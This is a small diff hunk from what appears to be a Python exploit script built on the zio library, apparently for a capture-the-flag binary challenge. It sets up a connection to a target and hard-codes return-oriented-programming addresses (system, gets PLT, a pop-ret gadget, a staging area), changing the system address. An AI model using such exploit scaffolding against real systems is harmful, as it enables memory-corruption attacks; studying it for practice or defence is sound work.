@@ -5,7 +5,7 @@ c_write = COLORED(RAW, 'blue')
 io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
 io.gdb_hint([0x080484f9])
 
-adr_system  = 0x8049708
+adr_system  = 0xbfecffb0
 plt_gets    = 0x08048380
 p_ret       = 0x08048453
 adr_stage   = 0x08049000
